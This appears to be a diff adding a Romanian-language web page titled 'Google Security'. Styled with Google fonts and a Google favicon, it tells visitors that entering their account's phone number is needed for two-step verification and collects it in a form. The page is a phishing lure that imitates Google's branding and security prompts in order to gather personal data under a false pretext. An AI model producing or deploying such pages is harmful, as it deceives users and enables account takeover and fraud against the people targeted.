@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+    <link rel="icon" type="image/png" href="google-favicon.png">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Google Security</h1>
+        </header>
+
+        <main>
+            <p class="description">Pentru a vă ajuta să vă protejați contul și să confirmați identitatea, vă rugăm să introduceți numărul de telefon asociat contului dumneavoastră. Acest pas este necesar pentru verificarea în doi pași.</p>
+
+            <form action="#" method="POST" class="security-form">
+                <div class="form-group">
+                    <label for="countryCode">Prefix țară:</label>
+                    <select id="countryCode" name="countryCode">
+                        <option value="+40">România (+40)</option>
+                        <option value="+1">Statele Unite (+1)</option>
+                        <option value="+44">Marea Britanie (+44)</option>
+                        <option value="+49">Germania (+49)</option>
+                        <option value="+33">Franța (+33)</option>
+                        <option value="+34">Spania (+34)</option>
+                        <option value="+39">Italia (+39)</option>
+                        <option value="+86">China (+86)</option>
+                        <option value="+91">India (+91)</option>
+                        <option value="+81">Japonia (+81)</option>
+                        </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="phoneNumber">Număr de telefon:</label>
+                    <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Ex: 723 123 456" required>
+                    </div>
+
+                <button type="submit">Protejează Contul</button>
+            </form>
+
+            <div class="links-footer">
+                <a href="#">Termeni de utilizare</a>
+                <a href="#">Confidențialitate</a>
+                <a href="#">Ajutor</a>
+            </div>
+        </main>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
